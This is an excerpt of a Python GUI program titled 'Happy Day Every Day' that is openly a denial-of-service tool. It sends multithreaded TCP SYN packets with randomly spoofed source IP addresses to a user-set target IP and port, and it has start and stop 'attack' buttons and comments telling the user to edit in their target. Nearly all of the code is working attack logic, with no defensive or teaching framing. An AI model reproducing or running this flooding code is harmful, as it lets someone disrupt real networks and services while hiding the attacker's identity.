...
def send_spoofed_packet(dst_ip, dst_port):
    spoofed_ip = fake_ip()
    ip_layer = IP(src=spoofed_ip, dst=dst_ip)
    tcp_layer = TCP(sport=random.randint(1024,65535), dport=dst_port, flags="S")
    packet = ip_layer / tcp_layer
    send(packet, verbose=False)
    return spoofed_ip

def send_requests(target, max_requests, delay, thread_id):
    global stop_flag, data_points
    i = 0
    while i < max_requests and not stop_flag:
        try:
            spoofed_ip = send_spoofed_packet(target, 443) # EDIT THIS IF YOUR TARGETS PORT IS DIFFERENT
            status = 1  
        except Exception as e:
            print(f"[Thread-{thread_id}] Error: {e}")
            status = 0

        data_points.append(status)
        print(f"[Thread-{thread_id}] [{i+1}] Packet sent from {spoofed_ip} -> {target}:443")
        i += 1
        time.sleep(delay)
...
def update_graph():
    global data_points
    ax.clear()
    ax.plot(data_points[-50:], color='blue')
    ax.set_ylim(0, 1.5)
    ax.set_title("Network Traffic / Spikes")
    canvas.draw()
    if not stop_flag:
...
def start_attack():
    ...
    try:
        max_requests = int(entry_requests.get())
    except:
        max_requests = 100
    try:
    ...
    for t in range(thread_count):
        Thread(target=send_requests, args=(target, max_requests, delay, t+1), daemon=True).start()
...
def stop_attack():
    ...
    ttk.Label(popup, text="Attack Completed ending with status code 200", padding=10).pack()
    ttk.Button(popup, text="OK", command=popup.destroy).pack(pady=5)

root = tk.Tk()
root.title("Happy Day Every Day")
...
#
# EDIT THIS TO YOUR TARGET IP - ~~~~ANONYMOUS~~~~
#
entry_target.insert(0, "10.0.0.1") # Edit this to your target IP

ttk.Label(frame, text="Packets:").grid(row=1, column=0, sticky="w")
entry_requests = ttk.Entry(frame, width=30)
entry_requests.grid(row=1, column=1)
entry_requests.insert(0, "100")

ttk.Label(frame, text="Threads:").grid(row=2, column=0, sticky="w")
entry_threads = ttk.Entry(frame, width=30)
entry_threads.grid(row=2, column=1)
entry_threads.insert(0, "5")

ttk.Label(frame, text="Delay (s):").grid(row=3, column=0, sticky="w")
entry_delay = ttk.Entry(frame, width=30)
entry_delay.grid(row=3, column=1)
entry_delay.insert(0, "0.01")

ttk.Button(frame, text="Start", command=start_attack).grid(row=4, column=0, pady=5)
ttk.Button(frame, text="Stop", command=stop_attack).grid(row=4, column=1, pady=5)
